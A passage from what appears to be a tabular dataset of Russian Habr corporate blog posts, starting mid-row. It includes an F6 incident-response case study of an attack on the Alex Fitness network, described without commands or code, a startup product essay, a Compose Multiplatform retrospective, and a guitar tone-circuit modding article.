воспроизведения утраченной экспертизы вендора мы пошли по пути создания дополнительного уровня безопасности. Это позволило обеспечить клиентам спокойствие и уверенность, а нам — возможность проводить работы без стресса.А как вы решаете проблемы с обслуживанием сложных систем в отсутствие поддержки вендора? Может быть, у вас есть другие успешные подходы? Делитесь в комментариях!"
41,Бой с тенью: специалисты F6 помогли отразить кибератаку на сеть клубов Alex Fitness,F6,Компания,0,"Программное обеспечение, Консалтинг и поддержка, Информационная безопасность",2025-04-10,"Современный ландшафт киберугроз диктует необходимость не только применять надежные технические средства защиты, но и выполнять непрерывный мониторинг событий системной и пользовательской активности на конечных устройствах сети. Если при случайной загрузке вредоносного ПО, например, с пиратским контентом, могут помочь стандартные антивирусные решения, то при целенаправленной атаке, за которой стоит группа профессионалов, успешное противодействие возможно только при участии команды опытных специалистов.В таких случаях недостаточно поблагодарить антивирус за обнаруженную и заблокированную угрозу. Важно понимать, что атакующие, чья активность только что была остановлена, потенциально все ещё имеют доступ к устройству и теперь знают о наличии защитной системы и её характеристиках. Это позволит злоумышленникам точечно проработать способы обхода используемого средства защиты и развить атаку, оставшись незамеченными.При обнаружении следов присутствия злоумышленников в корпоративной сети критически важно оперативно приступить к локализации инцидента и анализу его причин. Это необходимо, чтобы предотвратить дальнейшее развитие атаки или её повторение. Хотя в таких ситуациях может возникнуть соблазн полностью отключить сеть и начать восстановление с нуля, важно помнить: восстановление из резервных копий или повторное развертывание инфраструктуры по старым схемам может вернуть систему в уязвимое состояние или даже оставить её скомпрометированной. Поэтому при обнаружении активности атакующих необходимо выяснить, как именно они получили доступ к сети и какие действия предпринимали в процессе развития атаки. Это позволит устранить уязвимости ИТ-инфраструктуры, определить скомпрометированные узлы и убедиться в том, что атакующие утратили к ним доступ.Таким образом, даже хорошо настроенная система мониторинга требует постоянного контроля и анализа выявленных событий. Только комплексный и проактивный подход, включающий как технические средства, так и экспертизу специалистов, способен обеспечить устойчивость инфраструктуры в условиях постоянно эволюционирующих угроз.При обнаружении активности злоумышленников ещё на ранних этапах развития атаки крайне важно сохранить свое преимущество. Необходимо оперативно определить, какие инструменты используют атакующие для удаленного управления скомпрометированными устройствами, и заблокировать их. Кроме того, критически важно тщательно проанализировать весь жизненный цикл атаки, чтобы определить точку входа и установить, каким образом злоумышленники получили первоначальный доступ.Если этого не сделать, нет гарантий, что, отразив текущую атаку, компания в скором времени не столкнется с новой, которая будет развиваться по аналогичному сценарию. Устранение последствий без понимания причин проблемы может оставить инфраструктуру уязвимой для повторных атак. Поэтому ключевая задача реагирования на инцидент – не только блокировать текущие угрозы и предотвратить развитие инцидента, но и устранить его причины.В качестве примера рассмотрим случай из практики Центра кибербезопасности и Лаборатории цифровой криминалистики и исследования вредоносного кода F6, в котором слаженная работа специалистов нашей компании и сотрудников ИТ- и ИБ-подразделений клиента, сети клубов Alex Fitness, позволила успешно обнаружить атакующих, установить их инструментарий и своевременно локализовать атаку, не допустив деструктивного воздействия на ИТ-инфраструктуру или хищения данных.Раунд 1. Обнаружение подозрительной активностиВ пятницу вечером, 6 декабря 2024 года, модуль системы F6 MXDR зафиксировал аномальную активность на одном из серверов клиента.F6 MXDR — система проактивного поиска и защиты от сложных и неизвестных киберугроз. Позволяет своевременно обнаруживать и блокировать подозрительную активность на конечных устройствах ИТ-инфраструктуры, предотвращая дальнейшее развитие атаки. Также позволяет проводить проактивный поиск угроз на основании собираемой телеметрии.Рисунок 1. Сообщение об обнаружении системой F6 MXDR вредоносной активности на одном из серверов ИТ-инфраструктуры клиента  Автоматически сгенерированные системой XDR уведомления об обнаружении подозрительной активности были оперативно приняты в работу аналитиками Центра кибербезопасности F6 в рамках оказания услуги круглосуточного мониторинга инцидентов сервиса Managed Detection and Response.Центр кибербезопасности (ЦК) – центр круглосуточного мониторинга и реагирования на инциденты информационной безопасности компании F6. Используя современные технологии для защиты от сложных угроз, аналитики ЦК оперативно обнаруживают и нейтрализуют угрозы на начальных стадиях их развития, тем самым минимизируют последствия инцидентов и обеспечивают надежную защиту инфраструктуры компаний.Managed Detection and Response — сервис Центра кибербезопасности F6, обеспечивающий непрерывный мониторинг событий информационной безопасности, проактивный поиск угроз в сети и оперативное реагирование.Выявленная активность указывала на то, что атакующие уже получили доступ к внутреннему сегменту сети и возможность выполнять произвольные команды от имени пользователя, обладающего высокими привилегиями в системе. Поэтому аналитик ЦК проинформировал представителей клиента о выявленной вредоносной активности и инициировал эскалацию инцидента на следующий этап – сдерживание. Для предотвращения дальнейшего распространения атакующих по сети было принято решение изолировать скомпрометированный сервер средствами F6 MXDR. Таким образом, первые действия по изоляции устройств и предупреждения дальнейшего развития атаки были предприняты уже спустя 20 минут после обнаружения вредоносной активности.Режим изоляции устройства средствами модуля EDR позволяет прервать любое сетевое взаимодействие, кроме подключений к инфраструктуре F6 MXDR. Это позволяет предотвратить дальнейшее развитие инцидента, оборвать канал управления атакующих, но при этом сохранить доступ специалистов к устройству для проведения дальнейшего реагирования на инцидент и сбора необходимых для анализа данных.Рисунок 2. Сообщение об изоляции скомпрометированного сервера средствами F6 MXDR  Раунд 2. Анализ телеметрии MXDRПроведя анализ телеметрии, собранной системой F6 MXDR, аналитик ЦК восстановил хронологию запущенных процессов и сопоставил ее с иной активностью на устройстве. Стало ясно, что для удаленного выполнения команд злоумышленники использовали утилиту WMIExec из пакета Impacket. Теперь не осталось сомнений, что это не ложное срабатывание, а целенаправленные действия злоумышленников.Impacket – свободно распространяемый набор утилит, позволяющих осуществлять удаленное взаимодействие с устройствами при помощи различных сетевых протоколов. Большинство из инструментов предоставляют функционал удаленного выполнения произвольных команд, а также проведения внутренней разведки устройства сети.Рисунки 3-4. Сведения о выполненных злоумышленниками командах на скомпрометированном сервере, зафиксированные системой F6 MXDRТаким образом, злоумышленники провели внутреннюю разведку при помощи встроенных команд Windows, а также создали локальную учетную запись администратора. Созданная учетная запись была сразу заблокирована специалистами ЦК, а все удаленные сессии от ее имени завершены.  Рисунок 5. Сведения о выполненных злоумышленниками командах на скомпрометированном сервере, зафиксированные системой F6 MXDR  Раунд 3. Подключение криминалистов к анализуТеперь было необходимо выяснить, как атакующие получили доступ к серверу и как далеко успели продвинуться. Анализируя телеметрию, зафиксированную системой F6 MXDR, аналитик ЦК обнаружил, что, создав локальную учетную запись, злоумышленники успели подключиться к скомпрометированному серверу по протоколу удаленного рабочего стола Windows (RDP).Рисунок 6. Сведения о подключении атакующих с использованием созданной ранее учетной записи, зафиксированные системой F6 MXDR  Специалист ЦК сразу обратил внимание на то, что входящее RDP-подключение было инициировано с устройства из локальной сети ИТ-инфраструктуры клиента. Однако на этом устройстве не был установлен ЕDR-агент, поэтому телеметрия не поступала в систему и делала невозможным дальнейшее реагирование на инцидент без дополнительного сбора данных. Требовалось как можно быстрее определить устройство, с которого было инициировано подключение злоумышленников, и собрать с него необходимые для анализа данные.При этом после блокирования созданных злоумышленниками учетных записей, завершения удаленных сессий и изоляции скомпрометированного устройства оставалась вероятность, что злоумышленники все еще сохраняют доступ к ИТ-инфраструктуре клиента. Однако недостаточное покрытие конечных устройств EDR-агентами не позволяло контролировать активность на большинстве устройств сети. Поэтому одновременно с реагированием на инцидент был начат процесс установки EDR-агентов на критические узлы сети, такие как серверы и рабочие станции администраторов. А для дальнейшего анализа привлекли специалистов Лаборатории цифровой криминалистики и исследования вредоносного кода F6.Лаборатория цифровой криминалистики и исследования вредоносного кода F6 — одно из старейших подразделений компании с более чем 20-летней историей. Специалисты Лаборатории участвует в предотвращении целевых атак, реагировании на инциденты информационной безопасности и проверках готовности к такому реагированию, выявлении следов компрометации, проведении киберучений в формате Purple Teaming, фиксации цифровых доказательств, проведении криминалистических исследований, используя компетенции и технологии компании F6.Продолжение, все подробности анализа атаки, её расследования и отражения — читайте в блоге на сайте компании F6. "
42,Как перестать создавать продукты через пятую точку,OTUS,Цифровые навыки от ведущих экспертов,0,"Консалтинг и поддержка, Рекрутинг и HR, Производство мультимедиа-контента",2025-04-10,"Автор: Глеб Федосеев Часто вижу, как стартаперы придумывают свои продукты. Там обычно 2 пути, оба дурацкие. Я и сам через них проходил, поэтому рассказываю с высоты прожитого опыта. Первый путьКоманда ищет какую-то ПРОБЛЕМУ, которую продукт должен успешно решить.Родителям не нравится, что их дети проводят свободное время в играх в телефоне — давайте сделаем продукт для них!Предприниматели говорят, что им очень важно собирать отзывы от клиентов — делаем продукт!Баба Зина сказала, что Катька с 5-го подъезда проститутка — срочно фигачим продукт!Проблема первого пути — у людей на самом деле нет проблем. Если человек заявляет, что у него есть какая-то проблема, но он ничего не делает для ее решения — значит, проблемы нет. Если он ничего не делает для избавления от проблемы, то он никогда не купит наше решение.Если предприниматели заявляют, что отзывы очень важны для развития их бизнеса, но при этом ничего не делают для сбора этих отзывов — они никогда не купят наш продукт, который позволяет автоматизировать этот процесс.Если девочка жалуется, что она быстро спускает деньги, но при этом не пытается вести учет даже в экспельке — угадайте, насколько пофиг ей будет на наше приложение по учету финансов?Второй путьКоманда делает продукт, который поменяет жизнь клиента к лучшему! Но ради этого клиенту придется изменить свои привычки и внедрить в жизнь новые процессы.Скачай приложение и учитывай все свои финансы в одном окне!Купите своему ребенку онлайн курс и узнайте, на какую специальность в вузе лучше всего его отдать! (это вот я такой говнопродукт делал)Проводи регулярную оценку своих сотрудников с помощью нашего приложения!Проблема второго пути — человек не готов делать никакие новые действия и внедрять в свою жизнь новые привычки, только потому что у него появился ваш продукт.Если чел в принципе не тратит свое время на учебу, он не начнет пользоваться вашим приложением, в котором обучающие ролики в удобном игровом формате как в Тик Токе.Если бизнесмен не учитывает свои лиды даже в амбарной книге, он вашей CRM системой нафиг пользоваться не будет.Если компания не ведет свои соцсети, они никогда не купят вашего ИИ ассистента для создания контента.Так как продукт-то делать?Хороший продукт не решает проблемы людей. И не заставляет людей дополнительно работать и внедрять в свою жизнь новые привычки. Хороший помогает лучше и эффективнее выполнять задачи, которые люди уже и так каким-то способом пытаются решить. То есть продукт облегчает выполнение этих задач, избавляет людей от лишних / скучных процессов и действий.Раньше ты ездил на такси, звонил и заказывал машину за час до прибытия. А сейчас вот тебе Яндекс Такси. Больше не нужно тратить время на звонки и долго ждать.Раньше ты искал хорошую одежду по всем магазинам городу. А сейчас открывай Вайлдберриз и не трать время на поездки.Раньше ты обучал сотрудников с помощью бесконечных гугл документов и презентаций. А теперь держи платформу для корпоративного обучения. Теперь материалы будут храниться в одном месте, а обучение сотрудников будет быстрее и удобнее.Еще разок — хороший продукт помогает людям быстрее и удобнее решать задачу, которую они уже итак каким-то образом решали. Просто с продуктом они будут решать ее значительно быстрее и легче. В итоге алгоритм создания хорошего продукта выглядит так1. Находим процесс / задачу, на которую большое количество людей уже тратит время или деньгиНапример, большое количество маркетологов пытаются размещать рекламу у блогеров, но тратят кучу времени на поиск этих блогеров.2. Создаем продукт, который помогает клиенту выполнять этот процесс / задачу в разы быстрее или качественнееДелаем платформу, где можно быстро найти инфлюенсеров по конкретным фильтрам и разместить у них рекламу3. Тестируем, готовы ли люди пользоваться продуктом и платить за негоПривлекаем 10 блогеров из одного сегмента — например, блогеров-мамочек. Отбираем 50 компаний, которые продают детские товары и которые точно размещают рекламу у блогеров — мы видели их интеграции у других инфюенсеров. И предлагаем воспользоваться нашей платформой марк. дирам или владельцам этих компаний.Короче, если осознать эту логику, то делать продукты становится и проще, и сложнее. Проще, потому что мы сразу сможем отфильтровывать 99% фиговых идей. Сложнее, потому что часто других идей не остается :))Если вы хотите научиться правильно описывать своего клиента и понимать, как использовать эту информацию для практических целей, рекомендую посетить открытый урок в Otus 17 апреля. Вы разберетесь, почему традиционные портреты клиента не всегда работают и как создать более точное и полезное описание, которое реально поможет вам в работе. Записывайтесь, чтобы получить практические инструменты для эффективного маркетинга!"
43,"У нас в проекте был Compose Multiplatform, но снова я бы так не делал",Конференции Олега Бунина (Онтико),Профессиональные конференции для IT-разработчиков,0,"Веб-разработка, Оптимизация, Веб-сервисы",2025-04-10,"Мобильная разработка продолжает развиваться, но, если честно, никаких революционных прорывов в последнее время не произошло. Громкие темы, вроде Kotlin Multiplatform (KMP), Flutter, Jetpack Compose, SwiftUI, уже давно закрепились в индустрии, а новинки больше эволюционируют, чем меняют правила игры. Компании экспериментируют с кроссплатформенными решениями, и это выглядит логично. Писать общий код для iOS и Android 一 это экономия ресурсов и времени. Вроде бы верно, но на практике всё не так гладко.Привет, меня зовут Максим Плахута и с недавнего времени я руковожу Android разработкой «Кинопоиска». До этого руководил мобильной разработкой Почты Яндекс. А ещё я участник ПК новой конференции по мобильной разработке Apps Conf. Расскажу, какие шишки набили в реализации кроссплатформенного проекта и чего лучше не делать в современной мобильной разработке.Как мы адаптировали потоковую передачу на AndroidМоя первая серьёзная работа с видеостримингом в мобильных устройствах началась ещё во времена Android 4. Тогда существовали жёсткие ограничения на количество видеопотоков, которые устройство могло обрабатывать одновременно. Рынок кишел китайскими смартфонами с нестабильными характеристиками, разными типами процессоров и непредсказуемыми возможностями декодирования.Нам было нужно одновременное воспроизведение до 16 видеопотоков на одном устройстве, но мешало ограничение аппаратного декодирования и россыпь софтварных кодеков, которые могли банально не работать. Каждое устройство поддерживало разное количество потоков. И не всегда заявленные характеристики совпадали с реальностью, что приводило к неработающему видео.Тогда нам помогло нестандартное решение. Мы сделали автоматическое переключение между аппаратным и программным декодированием в реальном времени. Создали собственный программный декодер, который мог подхватывать нагрузку, если аппаратное декодирование не справлялось.Это позволило:Стабилизировать работу приложения даже на слабых устройствах.Оптимизировать нагрузку на процессор и память, перераспределяя потоки.Обеспечить плавное воспроизведение видео без артефактов и лагов.Фактически, пользователь просто включал видео 一 и оно работало. Без рывков, задержек и зависаний, хотя под капотом происходила сложная адаптация под конкретное железо. Нагрузка на устройство снизилась, что означало также и рост среднего качества просматриваемого видео на тех же сетях и это подтверждали пользовательские отзывы.Первый успех вскружил голову, поэтому хотелось всё более сложных задач и масштабных вызовов. И, конечно, они не заставили себя ждать.По сути, у нас был кроссплатформенный подход, в котором шаринговую часть мы писали на С++. Да, не бизнес-логика, но вполне себе большой модуль с дата-слоем. Но со временем внимания расшариванию решений на разные платформы становилось всё больше и в одном из проектов уже в Яндексе мы решили зайти чуть дальше.Разработка под давлениемПредставьте, что вам нужно запустить мобильное приложение за 3 месяца, а команда только что собралась! Её  сформировали с нуля, причём искали разработчиков с разными компетенциями. Нужен был стек сразу под iOS и Android. Да ещё как-то оптимизировать процессы, чтобы уложиться в сжатые сроки.У нас не было выбора — мало людей и времени, при этом нужно либо максимально катить фичи, либо поставлять такое же количество фичей, но сразу на две платформы. Возникнет вопрос, почему не Flutter? И у меня есть ответ:  look and feel нативных приложений. Конечно, и такие проблемы решаются. Но нам важно было не только решить текущие проблемы, но и подумать о поддержке решения в будущем, когда нас на проекте уже не будет. Обычно в таких проектах общий код ограничивается сетевым или дата-слоем, но мы пошли дальше и вынесли в кроссплатформенную часть бизнес-логику. Понадеялись на глубокие знания команды: понимание различий между iOS и Android, разработку кросс-платформенных API, которые должны были одинаково работать на обеих платформах. Ставку сделали на Kotlin Multiplatform (KMP).  Она, как раз таки, позволяла писать общую бизнес-логику для обеих платформ. Но мы сошли с ума и решили накрутить compose multiplatform, чтобы получить дополнительный таргет в виде десктопа (получили) и возможности закрывать лёгкие неважные фичи (типа экрана about) единоразовыми трудозатратами. И это была ошибка.Да, такой подход дал нам преимущества в скорости разработки, но привёл к сложностям: некоторые Android-библиотеки не имели аналогов на iOS, что требовало кастомных решений. Кроме того, в KMP существуют проблемы с инструментами, особенно при генерации обёрток для Swift.Пришлось постараться, обеспечивая взаимодействие между командами iOS и Android. Столкнулись мы, конечно, с обычными проблемами — необходимость погружаться в Kotlin код, сложные нечитаемые стактрейсы в случае проблем, очень ограниченная поддержка дебага. Но были и неожиданности: например, отсутствие compose preview. Не говоря уже про paginglibrary, поддержку dragndrop, которые пришлось выносить в expect/actual. Также мы словили проблемы всех early adopters — непонимание что и в каких версиях заехало в адаптированных библиотеках. Также получили невозможность использовать популярные решения типа Accompanist – они не имеют поддержки и приходится либо искать что-то другое, либо реализовать самостоятельно.Но несмотря на трудности, мы выстроили процессы так, чтобы каждая команда могла вносить изменения в общий код, тестировать его и адаптировать под свою платформу. Это позволило нам быстрее вывести продукт на рынок и уложиться в сжатые сроки.Сложности сборки и проблемы кроссплатформенных решенийГонка мобильной разработки всё ускорялась. Все хотели как можно сильнее сократить Time to market, и без кроссплатформенных решений было не обойтись. Поэтому, из-за своего бэкграунда, я сталкивался с ними на каждом втором проекте. Или даже чаще. Но проблема, как это часто бывает, заключается в недостаточно продуманных инструментах. И даже, если кто-то скажет что «плохому танцору» всегда что-то мешает, я отвечу 一 может и так. Но танцевать в туфлях на три размера меньше, — то ещё удовольствие.В нашем решении Kotlin Multiplatform показала себя хорошо, но в части Compose Multiplatform всё же пострадала производительность за счёт решения проблем, которых могло бы и не быть.Давайте обосную своё мнение. Я уже говорил, что не стал бы использовать  и Compose Multiplatform в текущем виде, и вот почему:Разные реализации API и неполнота функционала. Когда мы пробовали использовать Compose Multiplatform, то столкнулись с неожиданными проблемами.Отсутствие полного соответствия API. Некоторые вещи, к которым разработчики Android привыкли, просто не работали или работали иначе.Писать код приходилось с костылями. Мы создавали решения, которых не должно было быть в идеальном сценарии. Например, одна из самых неприятных ситуаций 一 невозможность использовать привычные инструменты превью. В Android-разработке привыкаешь сразу видеть изменения на экране и подстраивать вёрстку на лету. В кроссплатформенном подходе это не работает 一 приходится собирать проект, проверять его на устройстве, а затем снова возвращаться в код. Это сильно замедляет разработку и делает её менее удобной.Отсутствие библиотек и адаптации. Ещё одна проблема 一 молодость технологии. Когда мы начали работать с Compose Multiplatform, стало ясно, что поддержка библиотек оставляет желать лучшего. Многие популярные решения просто не были адаптированы, а искать альтернативы 一 дополнительная работа.Особенно сильно мы споткнулись на адаптации нашей дизайн-системы под Windows-платформу. Это оказалось настолько сложным процессом, что мы в какой-то момент задумались: а стоило ли вообще начинать?Накладные расходы на поддержку и обучение. Любая новая технология требует времени на обучение команды и адаптацию процессов. Здесь важно учитывать профиль команды. Если у вас перевес в сторону Android-разработчиков, то кроссплатформенные решения могут дать выигрыш, потому что iOS-адаптация будет проще. Если команда уже сбалансирована, то мультиплатформа скорее замедлит разработку, чем ускорит. Да, бытует мнение, что чинить баг один раз будет выгоднее на дистанции. Но, по факту, если разбирать его будет iOS разработчик, вы потеряете время из-за недостаточного тулинга. Либо весь багофикс целиком уйдёт в Android-команду, что приведёт к разбалансирвоке в реализации фич. И никакой сбалансированной команды не получится. Некоторые вещи, которые нативно работают идеально, в кроссплатформенном коде могут вести себя нестабильно.Поэтому перед тем, как принять решение о внедрении мультиплатформенного подхода, важно оценить зрелость процессов и готовность команды к таким изменениям. А чтобы всё это уверенно качать нужно комьюнити. Внутреннее сообщество, пусть и небольшое, позволяет решать многие проблемы быстрее и проще. И из него в итоге легче выходить в большое профессиональное сообщество.Как мы сделали «Яндекс 360» более узнаваемымКогда я пришёл в Яндекс 360, внутри компании и тем более за её пределами не понимали, чем именно мы занимаемся. Хотя мы разрабатывали действительно крутые решения. Наши технологии влияли на миллионы пользователей, как бы это пафосно не звучало, но мы об этом не рассказывали. Представляете, какая упущенная возможность не только для позиционирования, но и для привлечения новых талантов, обмена опытом и участия в профессиональном сообществе? Именно поэтому мы решили развивать внутреннее и внешнее комьюнити, чтобы открыто делиться своими разработками, решениями и челленджами.Я и несколько коллег из фронта и бэка подхватили инициативу и начали активно рассказывать о нашей работе. За короткое время заявили о себе на крупнейших конференциях, как докладчики и организаторы.Мы сделали ставку на несколько ключевых направлений:Выступления на конференциях. Мы не просто участвовали, а формировали присутствие Яндекс 360 как технически сильной команды. Выступали с докладами про Kotlin Multiplatform, архитектурные решения, CI/CD-процессы, продуктивность разработки и многое другое.Подготовку качественного контента. Мы не ограничивались докладами, а писали статьи, организовывали митапы и записывали подкасты. Это помогало продвигать наши идеи на широкую аудиторию.Сценарное развитие докладчиков. Мы не просто готовили отдельных спикеров, а системно развивали культуру публичных выступлений. Помогали коллегам оформлять мысли, правильно выстраивать повествование, делать доклады более живыми и увлекательными. Одним из самых удачных форматов стали «Смузи-доклады». Мы превратили технические презентации в выступления, стараясь разбавить сложный технический контент живыми историями, юмором и интерактивом. Это помогало доносить сложные темы в доступной форме, запоминаться и вызывать эмоции у более широкой аудитории.Самое интересное, оказалось, что развитие комьюнити 一 это не только PR, а возможность развиваться самому и помогать расти другим. У нас получилось создать активное и профессиональное сообщество, и мне приятно, что я могу быть полезен ещё большему количеству людей. Поэтому я и вошёл в состав программного комитета новой конференции по мобильной разработке Apps Conf. Хотя это уже не просто личная инициатива, а стратегический подход к развитию технологий и сообщества) И тут очень важно, не только готовить базу, но и двигаться с опережением — планировать то, что, возможно, произойдёт, представлять, куда будет двигаться всё направление в целом.Тренды, вызовы и новые возможности мобильной разработкиПоэтому у разработчиков не получиться расслабиться. Наоборот, сейчас особенно важно смотреть в будущее и понимать, какие технологии и подходы станут популярными в ближайшие годы.Основные направления, которые сейчас обсуждают в сообществе, можно свести к двум ключевым тезисам, первый.Как работать сейчас, чтобы потом не пришлось в панике адаптироваться к новым реалиям?Среди технических трендов самые интересные направления:Искусственный интеллект. Автоматизация и AI-инструменты, например, для генерации кода, тестирования, оптимизации пользовательского опыта и CI/CD становятся не просто удобным дополнением, а необходимостью. Поэтому, логично, что разработчики, которые научатся интегрировать AI в свои продукты, получат серьёзное преимущество.Эволюция кроссплатформенных решений. А один из главных векторов развития 一 объединение платформ и рост эффективности. Компании ищут способы сократить время разработки, уменьшить дублирование кода и оптимизировать ресурсы. JetBrains упразднили отдельное IDE Fleet для кроссплатформенных проектов в пользу интеграции тех же инструментов в Android Studio.На самом деле, подобные изменения происходят везде. К примеру, Kotlin Multiplatform (KMP) постепенно становится стандартом для кроссплатформенной мобильной разработки, несмотря на вызовы, связанные с производительностью и интеграцией с iOS. Хотя его всё ещё сложно назвать зрелым решением, будет интересно наблюдать, как индустрия адаптируется.В целом, бизнес всё больше смотрит в сторону мультиплатформенных решений, цветущий bdui тому подтверждение, но нативная разработка всё ещё остаётся важной. В этом году могут появиться новые инструменты и подходы, но радикальных изменений ждать не стоит.Рост автономных систем и офлайн-режима. Чем больше данных обрабатывается на устройстве без обращения к серверу, тем лучше. Это касается ML-моделей, работы с видео и персонализации контента.Новые подходы к UI/UX. Jetpack Compose и SwiftUI доказали свою состоятельность, но продолжают развиваться. Бэкенд для фронтенда (BFF) и server-driven UI набирают популярность, позволяя мобильным приложениям быстрее адаптироваться к изменениям. Возможно, мы увидим новый стандарт UI-разработки, основанный на декларативном подходе.Оптимизация и энергосбережение. Чем дальше, тем больше разработчиков будут вынуждены учитывать, как их код влияет на батарею устройства и расход процессорных ресурсов. Также актуален вопрос оптимизации потребления ресурсов. Чем сложнее становятся приложения, тем больше нагрузки они дают на батарею, процессор и память. Разработчики вынуждены искать способы уменьшить энергопотребление и ускорить работу интерфейса.Несмотря на развитие технологий, в мобильной разработке остаются незакрытые вопросы, которые активно обсуждаются в мировом комьюнити. Среди них производительность кроссплатформенных решений. Несмотря на все успехи KMP и Flutter, они всё ещё уступают нативным решениям по скорости и интеграции с платформенными API.А ещё сейчас в Android и iOS разработке нет единого «золотого стандарта». Кто-то использует MVI, MVVM, VIPER, кто-то — чистую архитектуру или свои кастомные решения. Это приводит к тому, что каждая команда фактически изобретает велосипед.Какие фундаментальные знания и технологии важно изучать, чтобы оставаться востребованным?Естественно развитие технологий повлияет на роль самого разработчика. IT всё сильнее перестаёт быть чисто технической сферой. Сейчас надо уметь думать как продуктовый менеджер, понимать бизнес-цели и предлагать оптимальные решения. То ли ещё будет.В Яндексе, например, мы видим четкую тенденцию. Разработчик должен не просто писать код, но глубже понимать, зачем он это делает. Софт-скиллы и проджект-менеджмент становятся важнее. Даже синьоры наравне с тимлидами учатся управлять процессами, анализировать требования и предлагать лучшие пути реализации. Поэтому ни для кого не станет страшным секретом, что успешными разработчиками будут те, кто сможет адаптироваться и учиться новому.Если говорить о минимальном техническом стеке, сейчас мобильному разработчику надо знать:Для Android: Kotlin, Jetpack Compose, архитектурные паттерны (MVI, MVVM), многопоточность и асинхронные операции (Coroutines, Flow).Для iOS: Swift, SwiftUI, Combine, глубокое понимание работы системы и многозадачности.Общие навыки: CI/CD, оптимизация производительности, работа с сетевыми запросами, адаптация UI под разные платформы.Глубокое понимание платформенных API и работы системы — оптимизация производительности, энергопотребление.Но ключ к успеху – это не просто знание инструментов, а понимание принципов разработки. Чем глубже залезаешь в основы — тем проще адаптироваться к любым изменениям в индустрии. Поэтому начинать прокачиваться лучше с базовых источников: «Effective Kotlin» – Марцин Москальский, «Clean Code» – Роберт Мартин, Документация по KMP, Jetpack Compose и SwiftUI.А ещё посещать профессиональные мероприятия как Apps Conf. Это всегда помогает быть в курсе актуальных проблем отрасли, разбираться в трендах и чувствовать, чем живёт индустрия! Плюс приятно и полезно найти новых коллег или работодателей, послушать про опыт других команд, вдохновиться и найти решения для собственных проектов.Поэтому приглашаю на конференцию!"
44,Котогитара одичала,RUVDS.com,VDS/VPS-хостинг. Скидка 15% по коду HABR15,0,"Связь и телекоммуникации, Домены и хостинг, Веб-сервисы",2025-04-10,"  Привет, Хабр! Мне всего лишь хотелось установить на самодельный инструмент свои любимые датчики P-90 и устранить микрофонный эффект, привносимый светомузыкальным устройством подмигивающих глаз кота. Но всё пошло не так, и результат значительно превзошёл ожидания, хотя для этого пришлось повозиться.  Специфические звучания электрогитар образуются благодаря фазовым сдвигам между сигналами катушек звукоснимателей. Эти сдвиги можно получать и регулировать, в том числе плавно и тонко, при помощи пассивных RLC-фильтров. Фильтры сегодняшнего темброблока усовершенствованы по сравнению с описанными в предыдущих статьях и предоставляют возможность «нарулить» ещё больше тембров — классических и авангардных. А ещё инструмент получил встроенный фузз, благодаря которому способен звучать как винтажный синтезатор.  ▍ Отправные точки  По состоянию на начало эксперимента, котообразная электрогитара из конструктора Harley-Benton от немецкого музыкального интернет-гипермаркета Thomann была оборудована штатными 10-килоомными хамбакерами закрытого типа с керамическими магнитами.    Тембр звучания этих дешёвых китайских датчиков и их отклик на динамику звукоизвлечения оставляют желать лучшего. Один из простейших способов апгрейда — установка магнитов из сплава ЮНДК (алнико 5) — на примере электрогитары за 6760 рублей показал себя просто прекрасно.    Кроме замены магнитов, есть и другие пути совершенствования. Например, внедрение продвинутого пассивного темброблока, что и было сделано в котогитаре.    Положение ручки регулятора «яркости» определяет степень шунтирования «нижней» обмотки некового хамбакера по высокой частоте, что устраняет неразборчивость звучания, вызванную большой межвитковой ёмкостью катушек и усугубляемую наличием клетки Фарадея — короткозамкнутого экрана вокруг звукоснимателя.  В свою очередь регулятор «фазы», активируемый поднятием ручки громкости, осуществляет две функции.    Когда на выход электрогитары подключён только нековый датчик, работа перестраиваемого пассивного фильтра ограничивается ослаблением нижних частот и сдвигом резонансного пика вверх.  Зато в среднем положении трёхпозиционного переключателя данный схемотехнический узел ещё и изменяет фазовый сдвиг между сигналами звукоснимателей, что позволяет получить перкуссивные «стеклянные» и назальные «твэнговые» тембры, характерные для инструментов с однокатушечными датчиками (синглами).   То есть, при использовании такой простой схемы синглкат или даблкат с двумя хамбакерами может звучать подобно стратокастеру или телекастеру, значительно расширяя исполнительские возможности музыканта без необходимости приносить с собой вторую или даже третью электрогитару.  ▍ Но я люблю P-90 Колебания ферромагнитных струн представляют собой стоячие волны с узлами и пучностями гармоник в определённых местах. Поэтому спектральный состав сигнала катушки гитарного звукоснимателя зависит не только от его расположения относительно струны, но и от рисунка силовых линий магнитного поля.  Казалось бы, одна катушка хамбакера должна представлять собой тот же самый сингл. Однако хамбакер с его магнитопроводами действует как подковообразный магнит, а сингл — как набор стержневых.    Поэтому «отсечка» катушки хамбакера делает из него не полный аналог сингла, а в лучшем случае хорошее подобие. В свою очередь, звучание узких хамбакеров в форм-факторе сингла значительно отличается от полноразмерных, хотя при желании это можно скорректировать при помощи пассивного фильтра — «варитона».     И, наконец, существуют особые «жирные» синглы — P-90, где полюса постоянных магнитов направлены не перпендикулярно, а параллельно плоскости струн. Подробно об этом можно прочитать здесь.    Эти звукосниматели просто прекрасны как для чистого звука, так и для перегруза во всём спектре его диапазонов, кроме экстремально высокого коэффициента усиления, где хамбакер незаменим в силу его свойства подавлять синфазные помехи от электросети и аппаратуры.  Как показал опыт с кастомным синглкатом «Обсидиан», магнитные поля окружающих датчиков влияют на спектр сигнала P-90, хотя это становится заметным только при сложении сигналов двух звукоснимателей данного типа.    Установка регулятора «фазы» на самодельную электрогитару в стиле PRS подтвердила возможность плавной регулировки соотношения перкуссивного «стекла» и назального «твэнга» в среднем положении трёхпозиционного переключателя при наличии всего-навсего двух однокатушечных датчиков типа P-90. Таким способом можно скомпенсировать и влияние «лишних» магнитов.    Итак, сегодня я устанавливаю любимые P-90 и на котогитару. В отличие от двух предыдущих заказов, сегодняшний комплект звукоснимателей пришёл в элегантной упаковке. Мелочь, а приятно.    Регулятор «фазы» некового датчика остаётся без изменений, зато бриджевый звукосниматель будет подключаться через катушку индуктивности, шунтируемую 25-килоомным переменным резистором.     Это позволит более тонко подстраивать звучание датчиков вместе и по отдельности. Сигнал бриджевого P-90 часто бывает чрезмерно «ядовитым», так что последовательная индуктивность окажется весьма кстати.  ▍ Берёмся за паяльник (с правильной стороны) Я использую миниатюрный звукотехнический трансформатор 600:600 Ом, соединяя его обмотки синфазно последовательно. Этот компонент предназначался для поверхностного монтажа, поэтому проволочные выводы придётся подпаять. Снова пригодятся откушенные ножки резисторов.    Нехитрый схемотехнический узел собран и готов к установке.    А вот и готовый темброблок.    Но зачем здесь батарейный отсек с тремя «мизинчиковыми» элементами типоразмера AAA?    Звукосниматели на котогитаре пассивные, и темброблок тоже. 